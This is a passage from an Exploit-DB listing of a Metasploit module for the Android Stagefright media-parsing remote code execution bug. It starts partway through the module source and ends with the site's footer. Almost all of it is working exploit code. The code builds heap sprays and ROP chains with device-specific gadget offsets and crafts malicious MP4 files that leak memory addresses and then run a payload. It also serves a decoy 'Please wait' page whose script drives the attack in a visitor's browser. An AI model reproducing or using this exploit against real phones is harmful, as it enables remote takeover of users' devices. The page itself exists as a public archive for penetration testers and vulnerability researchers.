              'Build' => 'LRX21T',
              'Release' => '5.0',
              'Rop' => 'sm-g900v / OE1',
              'SprayAddress' => 0xaf008000,
              'SampleIteratorSize' => 0xa8,
              'VectorSize' => 0xec
            }
          ]
        ],
      'Privileged'     => true,
      'DisclosureDate' => "Aug 13 2015",
      'DefaultTarget'  => 0))

=begin
    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class)
=end
  end

  def exploit
    @peers = {}
    super
  end

  def get_target(request)
    agent = request.headers['User-Agent']
    self.targets.each do |t|
      next if t.name == 'Automatic'
      regexp = Regexp.escape("Linux; Android #{t['Release']}; #{t['Model']} Build/#{t['Build']}")
      return t if (agent =~ /#{regexp}/)
    end
    return nil
  end

  #
  # Construct a page worth of data that we'll spray
  #
  # NOTE: The data within is target-specific
  #
  def build_spray(my_target, peer, spray_addr)
    # Initialize the page to a reasonable state.
    page = ''
    page = rand_text(4096)

    # Load target-based exploit-specific variables
    details = get_details(my_target)
    return nil if details.nil?

    # Calculate the libstagefright.so base address
    vector_rva = details['VectorRVA']
    vector_ptr = peer[:vector_vtable_addr]
    libsf_base = (vector_ptr & 0xfffff000) - (vector_rva & 0xfffff000)

    # If we smash mDataSource, this ends up controlling the program counter!!
=begin
    0xb65fd7c4 <parseChunk(long long*, int)+4596>:      ldr     r2, [r0, #0]
    0xb65fd7c6 <parseChunk(long long*, int)+4598>:      str     r1, [sp, #0]
    0xb65fd7c8 <parseChunk(long long*, int)+4600>:      ldr     r5, [r7, #0]
    0xb65fd7ca <parseChunk(long long*, int)+4602>:      str     r5, [sp, #4]
    0xb65fd7cc <parseChunk(long long*, int)+4604>:      ldr     r6, [r2, #28]
    0xb65fd7ce <parseChunk(long long*, int)+4606>:      ldrd    r2, r3, [r10]
    0xb65fd7d2 <parseChunk(long long*, int)+4610>:      blx     r6
    0xb65fd7d4 <parseChunk(long long*, int)+4612>:      ldrd    r2, r3, [sp, #64]       ; 0x40
=end

    # Initialize our pivot values and adjust them to libstagefright's base.
    # First, load r0 (pointer to our buffer) into some register..
    mds_pivot1 = libsf_base + details['Pivot1']

    # Next, load sp (and probably other stuff) from there
    mds_pivot2 = libsf_base + details['Pivot2']

    # Finally, skip over some stuff and kick of the ROP chain
    mds_adjust = libsf_base + details['Adjust']

    # The offset to the ROP change beginning
    rop_start_off = 0x30

    # Point sp to the remainder of the ROP chain
    new_sp = spray_addr + rop_start_off

    # Sometimes the spray isn't aligned perfectly, this fixes that situation...
    unalign_off = 0x998
    new_sp2 = new_sp + 0x1000 - unalign_off

    # This pointer should point to the beginning of the shellcode payload
    payload_ptr = spray_addr + 0xa0

    # Put the stack back!
    stack_fix = "\x0a\xd0\xa0\xe1"  # mov sp, r10 ; restore original sp

    # Depending on the pivot strategy in use, we have to set things up slightly
    # differently...
    #
    # In each case, we use a two-stage pivot that reads the spray address from
    # r0 (we smashed that, remember).
    #
    # The addroffs array is used to map values to the offsets where the pivots
    # expect them to be.
    #
    case details['PivotStrategy']
    when 'lrx'
      addroffs = [
        [ 0x0, new_sp ],
        [ 0x10, mds_pivot2 ],
        [ 0x1c, mds_pivot1 ],
      ]

      # Since we are only popping one item in pivot2, we reduce the rop_start_off
      rop_start_off -= 4

      # Adjust the payload pointer
      payload_ptr -= 4

    when 'lmy-1'
      addroffs = [
        [ 0x8, new_sp ],
        [ 0xc, mds_adjust ],
        [ 0x10, mds_pivot2 ],
        [ 0x1c, mds_pivot1 ]
      ]

    when 'lmy-2'
      ptr_to_mds_pivot2 = spray_addr + 0x10 - 0x18  # adjust for displacement
      addroffs = [
        [ 0x0, ptr_to_mds_pivot2 ],
        [ 0x8, new_sp ],
        [ 0xc, mds_adjust ],
        [ 0x10, mds_pivot2 ],
        [ 0x1c, mds_pivot1 ]
      ]

      stack_fix = "\x09\xd0\xa0\xe1"  # mov sp, r9 ; restore original sp

    when 'lyz'
      ptr_to_mds_pivot2 = spray_addr + 0x8
      addroffs = [
        [ 0x0, ptr_to_mds_pivot2 ],
        [ 0x8, mds_pivot2 ],
        [ 0x1c, mds_pivot1 ],
        [ 0x24, new_sp ],
        # lr is at 0x28!
        [ 0x2c, mds_adjust ]
      ]

      # We can't fix it becuse we don't know where the original stack is anymore :-/
      stack_fix = ""

    when 'sm-g900v'
      addroffs = [
        [ 0x4, mds_adjust ],
        [ 0x10, new_sp ],
        [ 0x1c, mds_pivot1 ],
        [ 0x20, mds_pivot2 ]
      ]

    else
      print_error("ERROR: PivotStrategy #{details['PivotStrategy']} is not implemented yet!")
      return nil
    end

    # We need our ROP to build the page... Create it.
    rop = generate_rop_payload('stagefright', stack_fix + payload.encoded, {'base' => libsf_base, 'target' => my_target['Rop'] })

    # Fix up the payload pointer in the ROP
    idx = rop.index([ 0xc600613c ].pack('V'))
    rop[idx, 4] = [ payload_ptr ].pack('V')

    # Insert the ROP
    page[rop_start_off, rop.length] = rop

    # Insert the special values...
    addroffs.each do |ao|
      off,addr = ao
      page[off,4] = [ addr ].pack('V')

      # Sometimes the spray isn't aligned perfectly...
      if addr == new_sp
        page[off+unalign_off,4] = [ new_sp2 ].pack('V')
      else
        page[off+unalign_off,4] = [ addr ].pack('V')
      end
    end

    page
  end

  #
  # MPEG-4 specific functionality
  #
  def get_atom(tag, data='', length=nil)
    if tag.length != 4
        raise 'Yo! They call it "FourCC" for a reason.'
    end

    length ||= data.length + 8
    if length >= 2**32
      return [ [ 1 ].pack('N'), tag, [ length ].pack('Q>'), data ].join
    end
    [ [ length ].pack('N'), tag, data ].join
  end

  def get_stsc(num)
    stsc_data = [ 0, num ].pack('N*')  # version/flags, mNumSampleToChunkOffsets
    stsc_data << [ 13+1, 0x5a5a5a5a, 37 ].pack('N*') * num
    get_atom('stsc', stsc_data)
  end

  def get_ftyp
    # Build the MP4 header...
    ftyp = 'mp42'
    ftyp << [ 0 ].pack('N')
    ftyp << 'mp42'
    ftyp << 'isom'
    get_atom('ftyp', ftyp)
  end

  def get_pssh(alloc_size)
    pssh_data = ''
    pssh_data << [ 0 ].pack('N')
    pssh_data << [ 0, 0, 0, 0 ].pack('N*')
    pssh_data << [ alloc_size ].pack('N')
    alloc_size.times do |off|
      pssh_data << [ 0x55aa0000 + off ] .pack('V')
    end
    get_atom('pssh', pssh_data)
  end

  def get_metaitem(tag, type, data)
    ret = ''
    ret << tag.reverse
    ret << type.reverse
    case type
    when 'in32'
      ret << [ 4, data ].pack('V*')
    when 'in64'
      ret << [ 8, data ].pack('V*')
    else
      raise "How do you expect me to make a #{type.inspect} ??"
    end
    ret
  end

  def jemalloc_round(sz)
    # These are in the 16-byte aligned runs
    if (sz > 0x10 && sz <= 0x80)
      round = 16
    # 160 starts the 32-byte aligned runs
    elsif (sz > 0x80 && sz <= 0x140)
      round = 32
    else
      raise "Don't know how to round 0x%x" % sz
    end
    ret = (sz + (round - 1)) / round
    ret *= round
    return ret
  end

  #
  # Leak data from mediaserver back to the browser!
  #
  # Stage 1 - leak a heap pointer near a SampleIterator object
  # Stage 2 - read a code pointer from the SampleIterator object
  #
  def get_mp4_leak(my_target, peer)
    # MPEG4 Fileformat Reference:
    # http://qtra.apple.com/index.html
    #
    # Structure:
    # [File type Chunk][Other Atom Chunks]
    #
    # Where [Chunk] == [Atom/Box Length][Atom/Box Type][Atom/Box Data]
    #
    sampiter_alloc_size = 0x78
    sampiter_alloc_size = my_target['SampleIteratorSize'] if not my_target['SampleIteratorSize'].nil?
    sampiter_rounded = jemalloc_round(sampiter_alloc_size)
    vector_alloc_size = 0x8c
    vector_alloc_size = my_target['VectorSize'] if not my_target['VectorSize'].nil?
    groom_count = 0x10

    is_samsung = (my_target['Rop'] == 'sm-g900v / OE1')

    # Coerce the heap into a favorable shape (fill holes)
    shape_vector = get_pssh(vector_alloc_size)

    # Allocate a block of memory of the correct size
    placeholder = get_atom('titl', ('t' * 4) + ('titl' * (vector_alloc_size / 4)) + [ 0 ].pack('C'))

    # Make the first tx3g chunk, which is meant to overflow into a MetaData array.
    # We account for the overhead of both chunks here and aim for this layout:
    #
    # placeholder after re-allocation                     | vector array data
    # <len><tag><padding><is-64bit><tag><len hi><len low> | <overflow data>
    #
    # Realistically, tx3g1_padding can be any number that rounds up to the
    # correct size class.
    tx3g1_overhead = 0x8
    tx3g2_overhead = 0x10
    tx3g_target = jemalloc_round(vector_alloc_size)
    tx3g1_padding = tx3g_target - (tx3g1_overhead + tx3g2_overhead)
    tx3g_data = 'x' * tx3g1_padding
    tx3g_1 = get_atom('tx3g', tx3g_data)

    # NOTE: hvcC added in 3b5a6b9fa6c6825a1d0b441429e2bb365b259827 (5.0.0 and later only)
    # avcC was in the initial commit.
    near_sampiter = get_atom('hvcC', "C" * sampiter_alloc_size)

    # Craft the data that will overwrite the header and part of the MetaData
    # array...
    more_data = ''
    more_data << [ 9, vector_alloc_size - 0x10, 0, 0 ].pack('V*')

    # Now add the thing(s) we want to control (partially)
    #
    # We add some BS entries just to kill the real 'heig' and get proper
    # ordering...
    near_sampiter_addr = peer[:near_sampiter_addr]
    if near_sampiter_addr.nil?
      # Part 1. Leak the address of a chunk that should be adjacent to a
      # SampleIterator object.
      if is_samsung
        # On Samsung:
        # Before: dmcE, dura, frmR, heig, hvcC, inpS, lang, mime, widt
        # After:  dmcE, abc1, abc2, abc3, heig...
        more_data << get_metaitem('dmcE', 'in32', 1)
        more_data << get_metaitem('abc1', 'in32', 31335)
        more_data << get_metaitem('abc2', 'in32', 31336)
      end

      # On Nexus:
      # Before: heig, hvcc, inpS, mime, text, widt
      # After:  abc3, heig...
      more_data << get_metaitem('abc3', 'in32', 31337)

      # NOTE: We only use the first 12 bytes so that we don't overwrite the
      # pointer that is already there!
      heig = get_metaitem('heig', 'in32', 31338)
      more_data << heig[0,12]
    else
      # Part 2. Read from the specified address, as with the original Metaphor
      # exploit.
      if is_samsung
        # On Samsung:
        # Before: dmcE, dura, frmR, heig, hvcC, inpS, lang, mime, widt
        # After:  dmcE, dura, ...
        more_data << get_metaitem('dmcE', 'in32', 1)
      else
        # On Nexus:
        # Before: avcc, heig, inpS, mime, text, widt
        # After:  dura, ...
        near_sampiter = get_atom('avcC', "C" * sampiter_alloc_size)
      end

      # Try to read the mCurrentChunkSampleSizes vtable ptr within a
      # SampleIterator object. This only works because the Vector is empty thus
      # passing the restrictions imposed by the duration conversion.
      ptr_to_vector_vtable = near_sampiter_addr - (sampiter_rounded * 2) + 0x30
      more_data << get_metaitem('dura', 'in64', ptr_to_vector_vtable)
    end

    # The tx3g2 then needs to trigger the integer overflow, but can contain any
    # contents. The overflow will terminate at the end of the file.
    #
    # NOTE: The second tx3g chunk's overhead ends up in the slack space between
    # the replaced placeholder and the MetaData Vector contents.
    big_num = 0x1ffffffff - tx3g_1.length + 1 + vector_alloc_size
    tx3g_2 = get_atom('tx3g', more_data, big_num)

    # Create a minimal, verified 'trak' to satisfy mLastTrack being set
    stbl_data = get_stsc(1)
    stbl_data << get_atom('stco', [ 0, 0 ].pack('N*'))     # version, mNumChunkOffsets
    stbl_data << get_atom('stsz', [ 0, 0, 0 ].pack('N*'))  # version, mDefaultSampleSize, mNumSampleSizes
    stbl_data << get_atom('stts', [ 0, 0 ].pack('N*'))     # version, mTimeToSampleCount
    stbl = get_atom('stbl', stbl_data)
    verified_trak = get_atom('trak', stbl)

    # Start putting it all together into a track.
    trak_data = ''

    if is_samsung
      # Put some legitimate duration information so we know if we failed
      mdhd_data = [ 0 ].pack('N')     # version
      mdhd_data << "\x00" * 8         # padding
      mdhd_data << [ 1 ].pack('N')    # timescale
      mdhd_data << [ 314 ].pack('N')  # duration
      mdhd_data << [ 0 ].pack('n')    # lang
      trak_data << get_atom('mdhd', mdhd_data)
    end

    # Add this so that our file is identified as video/mp4
    mp4v_data = ''
    mp4v_data << [ 0 ].pack('C') * 24 # padding
    mp4v_data << [ 1024 ].pack('n')   # width
    mp4v_data << [ 768 ].pack('n')    # height
    mp4v_data << [ 0 ].pack('C') * (78 - mp4v_data.length)  # padding
    trak_data << get_atom('mp4v', mp4v_data)  # satisfy hasVideo = true

    # Here, we cause allocations such that we can replace the placeholder...
    if is_samsung
      trak_data << placeholder   # Somethign we can free
      trak_data << shape_vector  # Eat the loose block...
      trak_data << stbl          # Cause the growth of the track->meta Vector
    else
      trak_data << stbl          # Cause the growth of the track->meta Vector
      trak_data << placeholder   # Somethign we can free
      trak_data << shape_vector  # Eat the loose block...
    end

    # Add the thing whose entry in the MetaData vector we want to overwrite...
    trak_data << near_sampiter

    # Get our overflow data into memory
    trigger = ''
    trigger << tx3g_1

    # Free the place holder
    trigger << get_atom('titl', ('t' * 4) + ('BBBB' * vector_alloc_size) + [ 0 ].pack('C'))

    # Overflow the temporary buffer into the following MetaData array
    trigger << tx3g_2

    # !!! NOTE !!!
    # On Samsung devices, the failure that causes ERR to be returned from
    # 'tx3g' processing leads to "skipTrack" being set. This means our
    # nasty track and it's metadata get deleted and not returned to the
    # browser -- effectively killing the infoleak.
    #
    # However! It also handles "skipTrack" being set specially and does not
    # immediately propagate the error to the caller. Instead, it returns OK.
    # This allows us to triggering the bug multiple times in one file, or --
    # as we have in this case -- survive after and return successfully.
    if is_samsung
      # Add this as a nested track!
      trak_data << get_atom('trak', trigger)
    else
      trak_data << trigger
    end
    trak = get_atom('trak', trak_data)

    # On Samsung devices, we could put more chunks here but they will
    # end up smashing the temporary buffer further...

    chunks = []
    chunks << get_ftyp()
    chunks << get_atom('moov')
    chunks << verified_trak * 0x200
    chunks << shape_vector * groom_count
    chunks << trak

    mp4 = chunks.join
    mp4
  end

  def get_mp4_rce(my_target, peer)
    # MPEG4 Fileformat Reference:
    # http://qtra.apple.com/index.html
    #
    # Structure:
    # [File type Chunk][Other Atom Chunks]
    #
    # Where [Chunk] == [Atom/Box Length][Atom/Box Type][Atom/Box Data]
    #
    chunks = []
    chunks << get_ftyp()

    # Note, this causes a few allocations
    moov_data = ''
    mvhd_data = [ 0, 0x41414141 ].pack('N*')
    mvhd_data << 'B' * 0x5c
    moov_data << get_atom('mvhd', mvhd_data)

    # Add a minimal, verified 'trak' to satisfy mLastTrack being set
    verified_trak = ''
    stbl_data = get_stsc(0x28)
    stbl_data << get_atom('stco', [ 0, 0 ].pack('N*'))     # version, mNumChunkOffsets
    stbl_data << get_atom('stsz', [ 0, 0, 0 ].pack('N*'))  # version, mDefaultSampleSize, mNumSampleSizes
    stbl_data << get_atom('stts', [ 0, 0 ].pack('N*'))     # version, mTimeToSampleCount
    verified_trak << get_atom('trak', get_atom('stbl', stbl_data))

    # Add it to the file
    moov_data << verified_trak

    # The spray_addr field is typically determined empirically (by testing), but
    # has proven to be fairly predictable (99%). However, it does vary from
    # one device to the next (probably determined by the pre-loaded libraries).
    spray_addr = 0xb0c08000
    spray_addr = my_target['SprayAddress'] if not my_target['SprayAddress'].nil?

    # Construct a single page that we will spray
    page = build_spray(my_target, peer, spray_addr)
    return nil if page.nil?

    # Build a big block full of spray pages and and put it in an avcC chunk
    # (but don't add it to the 'moov' yet)
    spray = page * (((16 * 1024 * 1024) / page.length) - 20)
    avcc = get_atom('avcC', spray)

    # Make the nasty trak
    tkhd1 = ''
    tkhd1 << [ 0 ].pack('C')  # version
    tkhd1 << 'D' * 3          # padding
    tkhd1 << 'E' * (5*4)      # {c,m}time, id, ??, duration
    tkhd1 << 'F' * 0x10       # ??
    tkhd1 << [
      0x10000,  # a00
      0,        # a01
      0,        # dx
      0,        # a10
      0x10000,  # a11
      0         # dy
    ].pack('N*')
    tkhd1 << 'G' * 0x14       # ??

    # Add the tkhd (track header) to the nasty track
    trak1 = ''
    trak1 << get_atom('tkhd', tkhd1)

    # Build and add the 'mdia' (Media information) to the nasty track
    mdia1 = ''
    mdhd1 = [ 0 ].pack('C')  # version
    mdhd1 << 'D' * 0x17      # padding
    mdia1 << get_atom('mdhd', mdhd1)
    mdia1 << get_atom('hdlr', 'F' * 0x38)  # Media handler
    dinf1 = ''
    dinf1 << get_atom('dref', 'H' * 0x14)  # Data information box
    minf1 = ''
    minf1 << get_atom('smhd', 'G' * 0x08)
    minf1 << get_atom('dinf', dinf1)
    stbl1 = get_stsc(2)
    minf1 << get_atom('stbl', stbl1)
    mdia1 << get_atom('minf', minf1)
    trak1 << get_atom('mdia', mdia1)

    # Add something to take up a slot in the 0x20 size range
    # NOTE: We have to be able to free this later...
    block = 'Q' * 0x1c
    trak1 << get_atom('covr', get_atom('data', [ 0, 0 ].pack('N*') + block))

    # Add a Track (hopefully right after)
    trak1 << verified_trak

    # Add the avcC chunk with the heap spray. We add it here so it's sure to be
    # allocated when we get control of the program counter...
    trak1 << avcc

    # Build the first of the nasty pair of tx3g chunks that trigger the
    # vulnerability
    alloc_size = 0x20
    overflow_size = 0xc0

    overflow = [ spray_addr ].pack('V') * (overflow_size / 4)
    tx3g_1 = get_atom('tx3g', overflow)
    trak1 << tx3g_1

    # Free the original thing and put the tx3g temporary in it's place...
    block = 'R' * 0x40
    trak1 << get_atom('covr', get_atom('data', [ 0, 0 ].pack('N*') + block))

    # Make the second one, which triggers the integer overflow
    big_num = 0x1ffffffff - 8 - overflow.length + 1 + alloc_size
    more_data = [ spray_addr ].pack('V') * (overflow_size / 4)
    tx3g_2 = get_atom('tx3g', more_data, big_num)
    trak1 << tx3g_2

    # Add the nasty track to the moov data
    moov_data << get_atom('trak', trak1)

    # Finalize the moov chunk
    moov = get_atom('moov', moov_data)
    chunks << moov

    # Combine outer chunks together and voila.
    mp4 = chunks.join
    mp4
  end

  def on_request_uri(cli, request)
    # If the request is for an mp4 file, we need to get the target from the @peers hash
    if request.uri =~ /\.mp4\?/i
      mp4_fn = request.uri.split('/')[-1]
      mp4_fn = mp4_fn.split('?')[0]
      mp4_fn[-4,4] = ''

      peer = @peers[mp4_fn]

      my_target = nil
      my_target = peer[:target] if peer
      if my_target.nil?
        send_not_found(cli)
        print_error("#{cli.peerhost}:#{cli.peerport} - Requested #{request.uri} - Unknown peer")
        return
      end

      # Extract the address(s) we just leaked...
      sia_addr = request.qstring['sia'].to_i  # near_sampiter data address
      peer[:near_sampiter_addr] = sia_addr if sia_addr > 0
      sfv_addr = request.qstring['sfv'].to_i  # stagefright Vector<size_t> vtable ptr
      peer[:vector_vtable_addr] = sfv_addr if sfv_addr > 0
      # reset after a crash..
      if sia_addr == 0 && sfv_addr == 0
        peer[:near_sampiter_addr] = peer[:vector_vtable_addr] = nil
      end

      # Always use this header
      out_hdrs = {'Content-Type'=>'video/mp4'}

      if peer[:vector_vtable_addr].nil?
        # Generate the nasty MP4 to leak infoz
        mode = "infoleak"
        mp4 = get_mp4_leak(my_target, peer)
      else
        mode = "RCE"
        mp4 = get_mp4_rce(my_target, peer)
        if mp4.nil?
          send_not_found(cli)
          print_error("#{cli.peerhost}:#{cli.peerport} - Requested #{request.uri} - Failed to generate RCE MP4")
          return
        end
      end

      # Send the nasty MP4 file to trigger the vulnerability
      if request.headers['Accept-Encoding'] and request.headers['Accept-Encoding'].include? 'gzip'
        mp4 = Rex::Text.gzip(mp4)
        out_hdrs.merge!('Content-Encoding' => 'gzip')
        gzip = "gzip'd"
      else
        gzip = "raw"
      end

      client = "Browser"
      if request.headers['User-Agent'].include? 'stagefright'
        client = "SF"
      end

      addrs = "heap: 0x%x, code: 0x%x" % [ peer[:near_sampiter_addr].to_i, peer[:vector_vtable_addr].to_i ]

      print_status("Sending #{mode} #{gzip} MPEG4 (#{mp4.length} bytes) to #{cli.peerhost}:#{cli.peerport}... (#{addrs} from #{client})")

      # Send the nastiness!
      send_response(cli, mp4, out_hdrs)
      return
    end

    # Initialize a target. If none suitable, then we don't continue.
    my_target = target
    if my_target.name =~ /Automatic/
      my_target = get_target(request)
      if my_target.nil?
        send_not_found(cli)
        print_error("#{cli.peerhost}:#{cli.peerport} - Requested #{request.uri} - Unknown user-agent: #{request['User-Agent'].inspect}")
        return
      end
      vprint_status("Target selected: #{my_target.name}")
    end

    # Generate an MP4 filename for this peer
    mp4_fn = rand_text_alpha(11)

    # Save the target for when they come back asking for this file
    # Also initialize the leak address to the first one
    @peers[mp4_fn] = { :target => my_target }

    # Send the index page
    mp4_uri = "#{get_resource.chomp('/')}/#{mp4_fn}.mp4"
    html = %Q^<html>
<head>
<title>Please wait...</title>
<script>
var video;       // the video tag
var to_id;       // timeout ID
var req_start;   // when we requested the video
var load_start;  // when we loaded the video
// Give mediaserver some time to settle down after restarting -- increases reliability
var waitTime = 100; // 6000;
var error = false;
var near_sampiter_addr = -1;
var vector_vtable_addr = -1;
var crashes = 0;

function duration_changed() {
  var now = Date.now();
  var req_time = now - req_start;
  var load_time = now - load_start;
  console.log('duration changed to: ' + video.duration + ' (load: ' + load_time + ', req: ' + req_time + '), 0x' + video.videoWidth.toString(16) + ' x 0x' + video.videoHeight.toString(16));
  if (load_time > 2000) {
    // probably crashed. reset the entire process..
    near_sampiter_addr = -1;
    vector_vtable_addr = -1;
    waitTime = 6000;
    crashes += 1;
    if (crashes > 5) {
      console.log('too many crashes!!!');
      stop_everything();
    }
  }
  else {
    // if we got the near_sampiter_addr already, we are now trying to read the code pointer.
    // otherwise, we're trying to find near_sampiter_addr...
    if (near_sampiter_addr == -1) {
      // if we get this value, we failed to overwrite the metadata. try again.
      if (video.videoHeight != 768) { // XXX: TODO: parameterize
        if (video.videoHeight != 0) { // wtf? crashed??
          value = video.videoHeight;
          console.log('leaked heap pointer: 0x' + value.toString(16));
          near_sampiter_addr = value;
        }
      }
    } else if (vector_vtable_addr == -1) {
      // if we get this value, we failed to overwrite the metadata. try again.
      if (video.duration != 314) { // XXX: TODO: parameterize
        // zero means a value that could not be represented...
        if (video.duration != 0) {
          var value = Math.round(video.duration * 1000000);
          console.log('leaked memory: ' + video.duration + ' (near_sampiter_addr: 0x' + near_sampiter_addr.toString(16) + '): 0x' + value.toString(16));

          vector_vtable_addr = value;
        }
      }
    }

    // otherwise, we just keep trying with the data we have...
  }

  if (error == false) {
    if (vector_vtable_addr == -1) {
      to_id = setTimeout(reload_leak, waitTime);
    } else {
      to_id = setTimeout(reload_rce, waitTime);
    }
    waitTime = 100;
  }
}

function stop_everything() {
  if (error == false) {
    console.log('---- GIVING UP!! ----');
    error = true;
  }
  if (to_id != -1) {
    clearTimeout(to_id);
  }
}

function start() {
  video = document.getElementById('vid');
  video.onerror = function() {
    console.log('  onError called!');
    stop_everything();
  }
  video.ondurationchange = duration_changed;
  //reload_rce();
  reload_leak();
}

function get_uri() {
  var rn = Math.floor(Math.random() * (0xffffffff - 1)) + 1;
  var uri = '#{mp4_uri}?x=' + rn;
  if (near_sampiter_addr != -1) {
    uri += '&sia=' + near_sampiter_addr;
  }
  if (vector_vtable_addr != -1) {
    uri += '&sfv=' + vector_vtable_addr;
  }
  return uri;
}

function reload_leak() {
  to_id = -1;
  var xhr = new XMLHttpRequest;
  xhr.responseType = 'blob';
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
      if (xhr.status != 200 || !xhr.response) {
        stop_everything();
        return;
      }
      load_start = Date.now();
      try {
        //var url = URL.createObjectURL(xhr.response);
        var a = new FileReader();
        a.onload = function(e) {
          //console.log('onload: ' + e.target.result);
          video.src = e.target.result
        };
        a.onerror = function(e) { console.log('blob 2 data error: ' + e.error); }
        a.readAsDataURL(xhr.response);
      } catch(e) {
        console.log('  ERROR: ' + e.message);
        stop_everything();
      }
    }
  };
  xhr.open('GET', get_uri(), true);
  req_start = Date.now();
  xhr.send();
}

function reload_rce() {
  to_id = -1;
  video.src = get_uri();
}
</script></head>
<body onload='start()'>
<video id=vid width=1px controls>
Your browser does not support VIDEO tags.
</video><br />
Please wait while we locate your content...
</body>
</html>
^
    print_status("Sending HTML to #{cli.peerhost}:#{cli.peerport}...")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

  #
  # Return some firmware-specific values to the caller.
  #
  # The VectorRVA field is extracted using the following command:
  #
  # $ arm-eabi-readelf -a libstagefright.so  | grep _ZTVN7android6VectorIjEE
  #
  def get_details(my_target)
    details = {
      'lrx' => {
        'VectorRVA' => 0x10ae30,
        'PivotStrategy' => 'lrx',
        'Pivot1' => 0x67f7b,   # ldr r4, [r0] ; ldr r1, [r4, #0x10] ; blx r1
        'Pivot2' => 0xaf9dd,   # ldm.w r4, {sp} ; pop {r3, pc}
        'Adjust' => 0x475cd    # pop {r3, r4, pc}
      },
      'lmy-1' => {
        'VectorRVA' => 0x10bd58,
        'PivotStrategy' => 'lmy-1',
        'Pivot1' => 0x68783,   # ldr r4, [r0] ; ldr r1, [r4, #0x10] ; blx r1
        'Pivot2' => 0x81959,   # ldm.w r4, {r1, ip, sp, pc}
        'Adjust' => 0x479b1    # pop {r3, r4, pc}
      },
      'lmy-2' => {
        'VectorRVA' => 0x10bd58,
        'PivotStrategy' => 'lmy-2',
        'Pivot1' => 0x6f093,   # ldr r0, [r0, #0x10] ; ldr r3, [r0] ; ldr r1, [r3, #0x18] ; blx r1
        'Pivot2' => 0x81921,   # ldm.w r0!, {r1, ip, sp, pc}
        'Adjust' => 0x479b1    # pop {r3, r4, pc}
      },
      'shamu / LYZ28E' => {
        'VectorRVA' => 0x116d58,
        'PivotStrategy' => 'lyz',
        'Pivot1' => 0x91e91,   # ldr r0, [r0] ; ldr r6, [r0] ; ldr r3, [r6] ; blx r3
        'Pivot2' => 0x72951,   # ldm.w r0, {r0, r2, r3, r4, r6, r7, r8, sl, fp, sp, lr, pc}
        'Adjust' => 0x44f81    # pop {r3, r4, pc}
      },
      'shamu / LYZ28J' => {
        'VectorRVA' => 0x116d58,
        'PivotStrategy' => 'lyz',
        'Pivot1' => 0x91e49,   # ldr r0, [r0] ; ldr r6, [r0] ; ldr r3, [r6] ; blx r3
        'Pivot2' => 0x72951,   # ldm.w r0, {r0, r2, r3, r4, r6, r7, r8, sl, fp, sp, lr, pc}
        'Adjust' => 0x44f81    # pop {r3, r4, pc}
      },
      'sm-g900v / OE1' => {
        'VectorRVA' => 0x174048,
        'PivotStrategy' => 'sm-g900v',
        'Pivot1' => 0x89f83,   # ldr r4, [r0] ; ldr r5, [r4, #0x20] ; blx r5
        'Pivot2' => 0xb813f,   # ldm.w r4!, {r5, r7, r8, fp, sp, lr} ; cbz r0, #0xb8158 ; ldr r1, [r0] ; ldr r2, [r1, #4] ; blx r2
        'Adjust' => 0x65421    # pop {r4, r5, pc}
      }
    }

    details[my_target['Rop']]
  end

end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
